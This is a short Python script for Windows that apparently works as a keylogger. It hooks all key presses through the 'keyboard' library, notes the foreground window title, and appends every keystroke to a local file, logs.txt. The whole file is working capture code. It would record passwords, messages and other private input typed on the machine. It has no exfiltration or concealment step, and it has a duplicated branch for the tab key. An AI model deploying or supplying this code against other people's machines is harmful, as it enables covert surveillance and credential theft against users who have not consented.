from keyboard import on_press, on_release, wait
from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime

def display(event, key):
    global ctrlpressed, shiftpressed, lastwindow
    if lastwindow != GetWindowText(GetForegroundWindow()):
        lastwindow = GetWindowText(GetForegroundWindow())
        with open("logs.txt","a") as f:
                f.write(lastwindow +"\n")
           
   # print('{0:8} {1:3} {2:5} {3:5} {4}'.format(datetime.fromtimestamp(event.time).strftime('%H:%M:%S'), event.scan_code, str(ctrlpressed), str(shiftpressed), key))
    with open("logs.txt","a") as f:
        if(key=="enter"):
            f.write("\n")
        elif(key=="tab"):
            f.write(" ")
        elif(key=="tab"):
            f.write(" ")
        else:
            f.write(str(key))
    #print(str(shiftpressed),key)
def KeyPressed(event):
    global ctrlpressed, shiftpressed
    if(event.name == 'shift' or event.name == 'right shift'):
       
        shiftpressed = True;
    elif(event.name == 'ctrl' or event.name == 'right ctrl'):
        ctrlpressed = True;
    else:
        display(event, event.name)

def KeyReleased(event):
    global ctrlpressed, shiftpressed
    if(event.name == 'shift' or event.name == 'right shift'):
        shiftpressed = False;
    elif(event.name == 'ctrl' or event.name == 'right ctrl'):
        ctrlpressed = False;

ctrlpressed = shiftpressed = False;
lastwindow = "";
on_press(KeyPressed)
on_release(KeyReleased)
wait()